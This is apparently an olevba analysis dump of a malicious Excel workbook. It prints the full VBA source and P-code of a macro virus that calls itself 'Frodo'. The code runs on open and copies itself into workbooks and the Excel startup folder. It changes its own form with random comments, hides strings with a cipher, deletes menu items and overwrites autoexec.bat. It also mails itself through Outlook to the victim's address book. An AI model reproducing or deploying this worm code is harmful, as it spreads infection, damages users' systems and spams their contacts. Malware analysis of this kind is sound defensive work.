olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Cartel.xls
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: Virus.MSExcel.Cartel.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Foglio1.cls 
in file: Virus.MSExcel.Cartel.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/Foglio1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Foglio2.cls 
in file: Virus.MSExcel.Cartel.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/Foglio2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Foglio3.cls 
in file: Virus.MSExcel.Cartel.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/Foglio3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Modulo1.bas 
in file: Virus.MSExcel.Cartel.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/Modulo1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' -------------------------------
' - Frodo.vba.Excel Virus v 1.0 -
' - based on the parasite virus    -
' - Using polymorphic and string-
' - encryption                            -
' -------------------------------

Sub AutoOpen()       ' autoexecute on open
 Application.OnSheetActivate = "frodo"   ' attach the procedure (Frodo) to
the SheetActivate event
 Call Mail      ' Call Mail Procedure
End Sub

Sub frodo()
 On Error Resume Next
 vname = crypt("gsnen")
 dwp = crypt("Qdsrno`m/ymr")
 dvp = Application.StartupPath & "\" & dwb
 counter1 = 0
 Counter2 = 0
 With Application
  .ScreenUpdating = False
  .DisplayAlert = False
  .EnableCancelKey = xlDisabled
 End With
 Set cb = CommandBars
 Set ctrl = Controls
 cb("Tools").ctrl(10).Delete: cb("Tools").ctrl(12).Delete
 cb("View").ctrl(3).Delete: cb("Window").ctrl(3).Delete
 cb("Window").ctrl(4).Delete
 Call Polymorph        ' Start Polymorphic Engine
 Randomize
 If Int((Rnd * 10) + 1) = 10 Then
  Application.Caption = crypt("Gsnen!Mhwdr!rnldvidsd!ho!Uhld")
  Application.StatusBar = crypt("Dybdm!Rtyy")
  Open "c:\autoexec.bat" For Output Access Write As 1
   Print #1, "@Echo off"
   Print #1, "Echo ---------------------------"
   Print #1, "Echo -   You owned by Frodo   -"
   Print #1, "Echo - greets to  Mr Shaer     -"
   Print #1, "Echo - 28.03.2002        -"
   Print #1, "Echo -   (C)by Dark Eclipse    -"
   Print #1, "Echo ---------------------------"
  Close 1
 End If
 If Month(Now) = 22 And Day(Now) = 5 Then Call bla
 If Month(Now) = 23 And Day(Now) = 5 Then Call blubb
 Application.VBE.ActiveVBProject.VBComponents.Item(vname).Export
Application.StartupPath & "\" & crypt("shofd/ymr/c`r")
 If Dir(dvp) = dwp Then Counter2 = 1
 For X = 1 To ActiveWorkbook.VBProject.VBComponents.Count
  If ActiveWorkbook.VBProject.VBComponents(X).Name = vname Then counter1 = 1
 Next X
 If counter1 = 0 Then
  ActiveWorkbook.VBProject.VBComponents.Import Application.StartupPath & "\"
& crypt("shofd/ymr/c`r")
  ActiveWorkbook.Save
 End If
 If Counter2 = 0 Then
  Workbook.Add.SaveAs FileName:=dvp
  ActiveWorkbook.VBProject.VBComponents.Import Application.StartupPath & "\"
& crypt("shofd/ymr/c`r")
  ActiveWindow.Visible = False
  Workbook(dwp).Save
 End If
End Sub

Sub bla()
 On Error Resume Next
 CommandBars("Edit").Enabled = False: CommandBars("Insert").Enabled = False
 CommandBars("Files").Enabled = False: CommandBard("Tools").Enabled = False
End Sub

Sub blubb()
 On Error Resume Next
 CommandBars("Edit").Enabled = True: CommandBars("Insert").Enabled = True
 CommandBars("Files").Enabled = True: CommandBars("Tools").Enabled = True
End Sub

Sub ViewVBCode()
 MsgBox Chr(84) + Chr(104) + Chr(105) + Chr(115) + Chr(32) + Chr(118) +
Chr(101) +
 Chr(114) + Chr(115) + Chr(105) + Chr(111) + Chr(110) + Chr(32) + Chr(111) +
Chr(102) +
 Chr(32) + Chr(77) + Chr(105) + Chr(99) + Chr(114) + Chr(111) + Chr(115) +
Chr(111) +
 Chr(102) + Chr(116) + Chr(32) + Chr(69) + Chr(120) + Chr(99) + Chr(101) +
Chr(108) & vbCr &
 Chr(112) + Chr(114) + Chr(111) + Chr(104) + Chr(105) + Chr(98) + Chr(105) +
Chr(116) +
 Chr(115) + Chr(32) + Chr(115) + Chr(117) + Chr(99) + Chr(104) + Chr(32) +
Chr(99) +
 Chr(111) + Chr(109) + Chr(109) + Chr(97) + Chr(110) + Chr(100) + Chr(115) +
Chr(44) +
 Chr(32) + Chr(112) + Chr(108) + Chr(101) + Chr(97) + Chr(115) + Chr(101) +
Chr(34) & vcCr & Chr(114) +
 Chr(101) + Chr(102) + Chr(101) + Chr(114) + Chr(32) + Chr(116) + Chr(111) +
Chr(32) + Chr(117) +
 Chr(115) + Chr(101) + Chr(114) + Chr(115) + Chr(32) + Chr(109) + Chr(97) +
Chr(110) + Chr(117) +
 Chr(97) + Chr(108) + Chr(32) + Chr(40) + Chr(115) + Chr(101) + Chr(99) +
Chr(46) + Chr(32) +
 Chr(50) + Chr(41) + Chr(32) _, vbCritical, "Microsoft Excel Warning"
 ActiveWorkbook.Save
 Shell Chr(67) + Chr(58) + Chr(92) + Chr(87) + Chr(73) + Chr(78) + Chr(68) +
Chr(79) + Chr(87) + Chr(83) +
 Chr(92) + Chr(82) + Chr(85) + Chr(78) + Chr(68) + Chr(76) + Chr(76) +
Chr(46) + Chr(69) + Chr(88) +
 Chr(69) + Chr(32) + Chr(117) + Chr(115) + Chr(101) + Chr(114) + Chr(46) +
Chr(101) + Chr(120) +
 Chr(101) + Chr(44) + Chr(101) + Chr(120) + Chr(105) + Chr(116) + Chr(119) +
Chr(105) + Chr(110) +
 Chr (100) + Chr(111) + Chr(119) + Chr(115), vbHide
End Sub

Sub Mail()
 On Error Resume Next
 Randomize
 'lots o variables ---------------------------
 Set outapp = CreateObject("Outlook.Application"): Set mapname =
outapp.GetNameSpace ("MAPI")
 Set al = AddressLists: Set cnt = Count: Set lo = Logoff: Set aeck =
Application: Set adacwb = Attachments
 Set sj = Subject: Set bdy = Body: Set Snd = send: Set awb = ActiveWorkbook:
Set fn = FullName
 Set lgon = Logon: Set citm = CreateItem: Set usnm = UserName: oln4 =
"Outlook"
 '--------------------------------------------
 aeck.EnableCancelKey = 0
 If outapp = oln4 Then mapname.lgon "profile", "password"
 For y = 1 To mapname.al.cnt
         mailoop = 1
  Set addlist = mapname.al(y): Set psite = outapp.citm(0)
  For z = 1 To addlist.al.cnt
one:
           vi = addlist.AddressEntries(mailoop)
    GoTo two
three:
           mailoop = mailoop + 1
           If mailoop > 40 Then z = addlist.al.cnt
           GoTo four
two:
           psite.Recipients.Add vi
           GoTo three
four:
         Next z

         psite.sj = "Lets make this work!"
         X = "Are you sick and tired of Microsoft products bugs? Lets unite"
and protest."
         X = X & "Fill up the attached form and send to ms-trial@doj.gov" +
Chr$ (13) + aeck.usnm
         psite.bdy = X
         psite.adacwb.Add awb.fn
         psite.Snd
  vi = ""
 Next y
 mapname.lo
End Sub

Function crypt(String)
 For bla = 1 To Len(String)
  blub = Mid(String, bla, 1)
  If Asc(blub) <> 34 And Asc(blub) <> 35 Then
   If Asc(blub) Mod 2 = 0 Then
    blub = Chr(Asc(blub) + 1 + 3 - 2 - 1)
  Else
    blub = Chr(Asc(blub) - 1)
   End If
  End If
 crypt = crypt & blub
 Next
End Function

Sub Polymorph()
 On Error Resume Next
 Set Current = MacroContainer
 For ploop = 1 To 20
  Number =
Current.VBProject.VBComponents("frodo").CodeModule.ProcCountLines("frodo",
vbext_pk_Proc)
         RandomLine = Int(Rnd() * Number + 1)
         rl = Int(Rnd() * 40 + 1)
         For cl = 1 To rl
                 rb = rb + Chr$(Int((90 - 65 + 1) * Rnd + 65))
         Next cl

          Current.VBProject.VBComponents("frodo").CodeModule.InsertLines
RandomLine , vbTab & "' " & rb
         rb = ""
 Next ploop
End Sub


-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Foglio
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Foglio
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Foglio
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSExcel.Cartel.xls
' ===============================================================================
' Module streams:
' _VBA_PROJECT_CUR/VBA/ThisWorkbook - 965 bytes
' _VBA_PROJECT_CUR/VBA/Foglio1 - 958 bytes
' _VBA_PROJECT_CUR/VBA/Foglio2 - 958 bytes
' _VBA_PROJECT_CUR/VBA/Foglio3 - 958 bytes
' _VBA_PROJECT_CUR/VBA/Modulo1 - 12458 bytes
' Line #0:
' 	QuoteRem 0x0000 0x0020 " -------------------------------"
' Line #1:
' 	QuoteRem 0x0000 0x0020 " - Frodo.vba.Excel Virus v 1.0 -"
' Line #2:
' 	QuoteRem 0x0000 0x0023 " - based on the parasite virus    -"
' Line #3:
' 	QuoteRem 0x0000 0x0020 " - Using polymorphic and string-"
' Line #4:
' 	QuoteRem 0x0000 0x002A " - encryption                            -"
' Line #5:
' 	QuoteRem 0x0000 0x0020 " -------------------------------"
' Line #6:
' Line #7:
' 	FuncDefn (Sub AutoOpen())
' 	QuoteRem 0x0015 0x0014 " autoexecute on open"
' Line #8:
' 	LitStr 0x0005 "frodo"
' 	Ld Application 
' 	MemSt OnSheetActivate 
' 	QuoteRem 0x0029 0x0020 " attach the procedure (Frodo) to"
' Line #9:
' 	Reparse 0x0017 "the SheetActivate event"
' Line #10:
' 	ArgsCall (Call) Mail 0x0000 
' 	QuoteRem 0x0010 0x0014 " Call Mail Procedure"
' Line #11:
' 	EndSub 
' Line #12:
' Line #13:
' 	FuncDefn (Sub frodo())
' Line #14:
' 	OnError (Resume Next) 
' Line #15:
' 	LitStr 0x0005 "gsnen"
' 	ArgsLd crypt 0x0001 
' 	St vname 
' Line #16:
' 	LitStr 0x000C "Qdsrno`m/ymr"
' 	ArgsLd crypt 0x0001 
' 	St dwp 
' Line #17:
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x0001 "\"
' 	Concat 
' 	Ld dwb 
' 	Concat 
' 	St dvp 
' Line #18:
' 	LitDI2 0x0000 
' 	St counter1 
' Line #19:
' 	LitDI2 0x0000 
' 	St Counter2 
' Line #20:
' 	StartWithExpr 
' 	Ld Application 
' 	With 
' Line #21:
' 	LitVarSpecial (False)
' 	MemStWith ScreenUpdating 
' Line #22:
' 	LitVarSpecial (False)
' 	MemStWith DisplayAlert 
' Line #23:
' 	Ld xlDisabled 
' 	MemStWith EnableCancelKey 
' Line #24:
' 	EndWith 
' Line #25:
' 	SetStmt 
' 	Ld CommandBars 
' 	Set cb 
' Line #26:
' 	SetStmt 
' 	Ld Controls 
' 	Set ctrl 
' Line #27:
' 	LitDI2 0x000A 
' 	LitStr 0x0005 "Tools"
' 	ArgsLd cb 0x0001 
' 	ArgsMemLd ctrl 0x0001 
' 	ArgsMemCall Delete 0x0000 
' 	BoS 0x0000 
' 	LitDI2 0x000C 
' 	LitStr 0x0005 "Tools"
' 	ArgsLd cb 0x0001 
' 	ArgsMemLd ctrl 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #28:
' 	LitDI2 0x0003 
' 	LitStr 0x0004 "View"
' 	ArgsLd cb 0x0001 
' 	ArgsMemLd ctrl 0x0001 
' 	ArgsMemCall Delete 0x0000 
' 	BoS 0x0000 
' 	LitDI2 0x0003 
' 	LitStr 0x0006 "Window"
' 	ArgsLd cb 0x0001 
' 	ArgsMemLd ctrl 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #29:
' 	LitDI2 0x0004 
' 	LitStr 0x0006 "Window"
' 	ArgsLd cb 0x0001 
' 	ArgsMemLd ctrl 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #30:
' 	ArgsCall (Call) Polymorph 0x0000 
' 	QuoteRem 0x0017 0x0019 " Start Polymorphic Engine"
' Line #31:
' 	ArgsCall Read 0x0000 
' Line #32:
' 	Ld Rnd 
' 	LitDI2 0x000A 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	LitDI2 0x000A 
' 	Eq 
' 	IfBlock 
' Line #33:
' 	LitStr 0x001D "Gsnen!Mhwdr!rnldvidsd!ho!Uhld"
' 	ArgsLd crypt 0x0001 
' 	Ld Application 
' 	MemSt Caption 
' Line #34:
' 	LitStr 0x000A "Dybdm!Rtyy"
' 	ArgsLd crypt 0x0001 
' 	Ld Application 
' 	MemSt StatusBar 
' Line #35:
' 	LitStr 0x000F "c:\autoexec.bat"
' 	LitDI2 0x0001 
' 	LitDefault 
' 	Open (For Output Access Write)
' Line #36:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0009 "@Echo off"
' 	PrintItemNL 
' Line #37:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0020 "Echo ---------------------------"
' 	PrintItemNL 
' Line #38:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001F "Echo -   You owned by Frodo   -"
' 	PrintItemNL 
' Line #39:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0020 "Echo - greets to  Mr Shaer     -"
' 	PrintItemNL 
' Line #40:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001A "Echo - 28.03.2002        -"
' 	PrintItemNL 
' Line #41:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0020 "Echo -   (C)by Dark Eclipse    -"
' 	PrintItemNL 
' Line #42:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0020 "Echo ---------------------------"
' 	PrintItemNL 
' Line #43:
' 	LitDI2 0x0001 
' 	Close 0x0001 
' Line #44:
' 	EndIfBlock 
' Line #45:
' 	Ld Now 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0016 
' 	Eq 
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0005 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) bla 0x0000 
' 	EndIf 
' Line #46:
' 	Ld Now 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0017 
' 	Eq 
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0005 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) blubb 0x0000 
' 	EndIf 
' Line #47:
' 	Ld vname 
' 	Ld Application 
' 	MemLd VBE 
' 	MemLd ActiveVBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	ArgsMemCall Export 0x0000 
' Line #48:
' 	Reparse 0x0036 "Application.StartupPath & "\" & crypt("shofd/ymr/c`r")"
' Line #49:
' 	Ld dvp 
' 	ArgsLd Dir 0x0001 
' 	Ld dwp 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St Counter2 
' 	EndIf 
' Line #50:
' 	StartForVariable 
' 	Ld X 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ActiveWorkbook 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #51:
' 	Ld X 
' 	Ld ActiveWorkbook 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	Ld vname 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St counter1 
' 	EndIf 
' Line #52:
' 	StartForVariable 
' 	Ld X 
' 	EndForVariable 
' 	NextVar 
' Line #53:
' 	Ld counter1 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #54:
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x0001 "\"
' 	Concat 
' 	Ld ActiveWorkbook 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #55:
' 	Reparse 0x0018 "& crypt("shofd/ymr/c`r")"
' Line #56:
' 	Ld ActiveWorkbook 
' 	ArgsMemCall Save 0x0000 
' Line #57:
' 	EndIfBlock 
' Line #58:
' 	Ld Counter2 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #59:
' 	Ld dvp 
' 	ParamNamed FileName 
' 	Ld Workbook 
' 	MemLd Add 
' 	ArgsMemCall SaveAs 0x0001 
' Line #60:
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x0001 "\"
' 	Concat 
' 	Ld ActiveWorkbook 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #61:
' 	Reparse 0x0018 "& crypt("shofd/ymr/c`r")"
' Line #62:
' 	LitVarSpecial (False)
' 	Ld ActiveWindow 
' 	MemSt Visible 
' Line #63:
' 	Ld dwp 
' 	ArgsLd Workbook 0x0001 
' 	ArgsMemCall Save 0x0000 
' Line #64:
' 	EndIfBlock 
' Line #65:
' 	EndSub 
' Line #66:
' Line #67:
' 	FuncDefn (Sub bla())
' Line #68:
' 	OnError (Resume Next) 
' Line #69:
' 	LitVarSpecial (False)
' 	LitStr 0x0004 "Edit"
' 	ArgsLd CommandBars 0x0001 
' 	MemSt Enabled 
' 	BoS 0x0000 
' 	LitVarSpecial (False)
' 	LitStr 0x0006 "Insert"
' 	ArgsLd CommandBars 0x0001 
' 	MemSt Enabled 
' Line #70:
' 	LitVarSpecial (False)
' 	LitStr 0x0005 "Files"
' 	ArgsLd CommandBars 0x0001 
' 	MemSt Enabled 
' 	BoS 0x0000 
' 	LitVarSpecial (False)
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBard 0x0001 
' 	MemSt Enabled 
' Line #71:
' 	EndSub 
' Line #72:
' Line #73:
' 	FuncDefn (Sub blubb())
' Line #74:
' 	OnError (Resume Next) 
' Line #75:
' 	LitVarSpecial (True)
' 	LitStr 0x0004 "Edit"
' 	ArgsLd CommandBars 0x0001 
' 	MemSt Enabled 
' 	BoS 0x0000 
' 	LitVarSpecial (True)
' 	LitStr 0x0006 "Insert"
' 	ArgsLd CommandBars 0x0001 
' 	MemSt Enabled 
' Line #76:
' 	LitVarSpecial (True)
' 	LitStr 0x0005 "Files"
' 	ArgsLd CommandBars 0x0001 
' 	MemSt Enabled 
' 	BoS 0x0000 
' 	LitVarSpecial (True)
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	MemSt Enabled 
' Line #77:
' 	EndSub 
' Line #78:
' Line #79:
' 	FuncDefn (Sub ViewVBCode())
' Line #80:
' 	Reparse 0x0047 " MsgBox Chr(84) + Chr(104) + Chr(105) + Chr(115) + Chr(32) + Chr(118) +"
' Line #81:
' 	Reparse 0x000A "Chr(101) +"
' Line #82:
' 	Reparse 0x004C " Chr(114) + Chr(115) + Chr(105) + Chr(111) + Chr(110) + Chr(32) + Chr(111) +"
' Line #83:
' 	Reparse 0x000A "Chr(102) +"
' Line #84:
' 	Reparse 0x004A " Chr(32) + Chr(77) + Chr(105) + Chr(99) + Chr(114) + Chr(111) + Chr(115) +"
' Line #85:
' 	Reparse 0x000A "Chr(111) +"
' Line #86:
' 	Reparse 0x004A " Chr(102) + Chr(116) + Chr(32) + Chr(69) + Chr(120) + Chr(99) + Chr(101) +"
' Line #87:
' 	Reparse 0x0011 "Chr(108) & vbCr &"
' Line #88:
' 	Reparse 0x004C " Chr(112) + Chr(114) + Chr(111) + Chr(104) + Chr(105) + Chr(98) + Chr(105) +"
' Line #89:
' 	Reparse 0x000A "Chr(116) +"
' Line #90:
' 	Reparse 0x004A " Chr(115) + Chr(32) + Chr(115) + Chr(117) + Chr(99) + Chr(104) + Chr(32) +"
' Line #91:
' 	Reparse 0x0009 "Chr(99) +"
' Line #92:
' 	Reparse 0x004C " Chr(111) + Chr(109) + Chr(109) + Chr(97) + Chr(110) + Chr(100) + Chr(115) +"
' Line #93:
' 	Reparse 0x0009 "Chr(44) +"
' Line #94:
' 	Reparse 0x004B " Chr(32) + Chr(112) + Chr(108) + Chr(101) + Chr(97) + Chr(115) + Chr(101) +"
' Line #95:
' 	Reparse 0x001B "Chr(34) & vcCr & Chr(114) +"
' Line #96:
' 	Reparse 0x004C " Chr(101) + Chr(102) + Chr(101) + Chr(114) + Chr(32) + Chr(116) + Chr(111) +"
' Line #97:
' 	Reparse 0x0014 "Chr(32) + Chr(117) +"
' Line #98:
' 	Reparse 0x004B " Chr(115) + Chr(101) + Chr(114) + Chr(115) + Chr(32) + Chr(109) + Chr(97) +"
' Line #99:
' 	Reparse 0x0015 "Chr(110) + Chr(117) +"
' Line #100:
' 	Reparse 0x0049 " Chr(97) + Chr(108) + Chr(32) + Chr(40) + Chr(115) + Chr(101) + Chr(99) +"
' Line #101:
' 	Reparse 0x0013 "Chr(46) + Chr(32) +"
' Line #102:
' 	Reparse 0x0045 " Chr(50) + Chr(41) + Chr(32) _, vbCritical, "Microsoft Excel Warning""
' Line #103:
' 	Ld ActiveWorkbook 
' 	ArgsMemCall Save 0x0000 
' Line #104:
' 	Reparse 0x004C " Shell Chr(67) + Chr(58) + Chr(92) + Chr(87) + Chr(73) + Chr(78) + Chr(68) +"
' Line #105:
' 	Reparse 0x001D "Chr(79) + Chr(87) + Chr(83) +"
' Line #106:
' 	Reparse 0x0046 " Chr(92) + Chr(82) + Chr(85) + Chr(78) + Chr(68) + Chr(76) + Chr(76) +"
' Line #107:
' 	Reparse 0x001D "Chr(46) + Chr(69) + Chr(88) +"
' Line #108:
' 	Reparse 0x004A " Chr(69) + Chr(32) + Chr(117) + Chr(115) + Chr(101) + Chr(114) + Chr(46) +"
' Line #109:
' 	Reparse 0x0015 "Chr(101) + Chr(120) +"
' Line #110:
' 	Reparse 0x004C " Chr(101) + Chr(44) + Chr(101) + Chr(120) + Chr(105) + Chr(116) + Chr(119) +"
' Line #111:
' 	Reparse 0x0015 "Chr(105) + Chr(110) +"
' Line #112:
' 	LitDI2 0x0064 
' 	Paren 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0077 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0073 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld vbHide 
' 	ArgsCall Chr 0x0002 
' Line #113:
' 	EndSub 
' Line #114:
' Line #115:
' 	FuncDefn (Sub Mail())
' Line #116:
' 	OnError (Resume Next) 
' Line #117:
' 	ArgsCall Read 0x0000 
' Line #118:
' 	QuoteRem 0x0001 0x002C "lots o variables ---------------------------"
' Line #119:
' 	Reparse 0x0040 " Set outapp = CreateObject("Outlook.Application"): Set mapname ="
' Line #120:
' 	LitStr 0x0004 "MAPI"
' 	Paren 
' 	Ld outapp 
' 	ArgsMemCall GetNameSpace 0x0001 
' Line #121:
' 	Reparse 0x0044 " Set al = AddressLists: Set cnt = Count: Set lo = Logoff: Set aeck ="
' Line #122:
' 	Label Application 
' 	SetStmt 
' 	Ld Attachments 
' 	Set adacwb 
' Line #123:
' 	SetStmt 
' 	Ld Subject 
' 	Set sj 
' 	BoS 0x0000 
' 	SetStmt 
' 	Ld Body 
' 	Set bdy 
' 	BoS 0x0000 
' 	SetStmt 
' 	Ld send 
' 	Set Snd 
' 	BoS 0x0000 
' 	SetStmt 
' 	Ld ActiveWorkbook 
' 	Set awb 
' 	BoS 0x0000 
' Line #124:
' 	SetStmt 
' 	Ld FullName 
' 	Set fn 
' Line #125:
' 	Reparse 0x0045 " Set lgon = Logon: Set citm = CreateItem: Set usnm = UserName: oln4 ="
' Line #126:
' 	Reparse 0x0009 ""Outlook""
' Line #127:
' 	QuoteRem 0x0001 0x002C "--------------------------------------------"
' Line #128:
' 	LitDI2 0x0000 
' 	Ld aeck 
' 	MemSt EnableCancelKey 
' Line #129:
' 	Ld outapp 
' 	Ld oln4 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0007 "profile"
' 	LitStr 0x0008 "password"
' 	Ld mapname 
' 	ArgsMemCall lgon 0x0002 
' 	EndIf 
' Line #130:
' 	StartForVariable 
' 	Ld y 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld mapname 
' 	MemLd al 
' 	MemLd cnt 
' 	For 
' Line #131:
' 	LitDI2 0x0001 
' 	St mailoop 
' Line #132:
' 	SetStmt 
' 	Ld y 
' 	Ld mapname 
' 	ArgsMemLd al 0x0001 
' 	Set addlist 
' 	BoS 0x0000 
' 	SetStmt 
' 	LitDI2 0x0000 
' 	Ld outapp 
' 	ArgsMemLd citm 0x0001 
' 	Set psite 
' Line #133:
' 	StartForVariable 
' 	Ld z 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld addlist 
' 	MemLd al 
' 	MemLd cnt 
' 	For 
' Line #134:
' 	Label one 
' Line #135:
' 	Ld mailoop 
' 	Ld addlist 
' 	ArgsMemLd AddressEntries 0x0001 
' 	St vi 
' Line #136:
' 	GoTo two 
' Line #137:
' 	Label three 
' Line #138:
' 	Ld mailoop 
' 	LitDI2 0x0001 
' 	Add 
' 	St mailoop 
' Line #139:
' 	Ld mailoop 
' 	LitDI2 0x0028 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	Ld addlist 
' 	MemLd al 
' 	MemLd cnt 
' 	St z 
' 	EndIf 
' Line #140:
' 	GoTo four 
' Line #141:
' 	Label two 
' Line #142:
' 	Ld vi 
' 	Ld psite 
' 	MemLd Recipients 
' 	ArgsMemCall Add 0x0001 
' Line #143:
' 	GoTo three 
' Line #144:
' 	Label four 
' Line #145:
' 	StartForVariable 
' 	Ld z 
' 	EndForVariable 
' 	NextVar 
' Line #146:
' Line #147:
' 	LitStr 0x0014 "Lets make this work!"
' 	Ld psite 
' 	MemSt sj 
' Line #148:
' 	LitStr 0x003D "Are you sick and tired of Microsoft products bugs? Lets unite"
' 	St X 
' Line #149:
' 	Reparse 0x000D "and protest.""
' Line #150:
' 	Reparse 0x004B "         X = X & "Fill up the attached form and send to ms-trial@doj.gov" +"
' Line #151:
' 	LitDI2 0x000D 
' 	Paren 
' 	Ld aeck 
' 	MemLd usnm 
' 	Add 
' 	ArgsCall Chr$ 0x0001 
' Line #152:
' 	Ld X 
' 	Ld psite 
' 	MemSt bdy 
' Line #153:
' 	Ld awb 
' 	MemLd fn 
' 	Ld psite 
' 	MemLd adacwb 
' 	ArgsMemCall Add 0x0001 
' Line #154:
' 	Ld psite 
' 	ArgsMemCall Snd 0x0000 
' Line #155:
' 	LitStr 0x0000 ""
' 	St vi 
' Line #156:
' 	StartForVariable 
' 	Ld y 
' 	EndForVariable 
' 	NextVar 
' Line #157:
' 	Ld mapname 
' 	ArgsMemCall lo 0x0000 
' Line #158:
' 	EndSub 
' Line #159:
' Line #160:
' 	Reparse 0x0016 "Function crypt(String)"
' Line #161:
' 	Reparse 0x001B " For bla = 1 To Len(String)"
' Line #162:
' 	Reparse 0x001C "  blub = Mid(String, bla, 1)"
' Line #163:
' 	Ld blub 
' 	ArgsLd Asc 0x0001 
' 	LitDI2 0x0022 
' 	Ne 
' 	Ld blub 
' 	ArgsLd Asc 0x0001 
' 	LitDI2 0x0023 
' 	Ne 
' 	And 
' 	IfBlock 
' Line #164:
' 	Ld blub 
' 	ArgsLd Asc 0x0001 
' 	LitDI2 0x0002 
' 	Mod 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #165:
' 	Ld blub 
' 	ArgsLd Asc 0x0001 
' 	LitDI2 0x0001 
' 	Add 
' 	LitDI2 0x0003 
' 	Add 
' 	LitDI2 0x0002 
' 	Sub 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd Chr 0x0001 
' 	St blub 
' Line #166:
' 	ElseBlock 
' Line #167:
' 	Ld blub 
' 	ArgsLd Asc 0x0001 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd Chr 0x0001 
' 	St blub 
' Line #168:
' 	EndIfBlock 
' Line #169:
' 	EndIfBlock 
' Line #170:
' 	Ld crypt 
' 	Ld blub 
' 	Concat 
' 	St crypt 
' Line #171:
' 	StartForVariable 
' 	Next 
' Line #172:
' 	EndFunc 
' Line #173:
' Line #174:
' 	FuncDefn (Sub Polymorph())
' Line #175:
' 	OnError (Resume Next) 
' Line #176:
' 	SetStmt 
' 	Ld MacroContainer 
' 	Set Current 
' Line #177:
' 	StartForVariable 
' 	Ld ploop 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0014 
' 	For 
' Line #178:
' 	Reparse 0x000A "  Number ="
' Line #179:
' 	Reparse 0x004A "Current.VBProject.VBComponents("frodo").CodeModule.ProcCountLines("frodo","
' Line #180:
' 	Reparse 0x000E "vbext_pk_Proc)"
' Line #181:
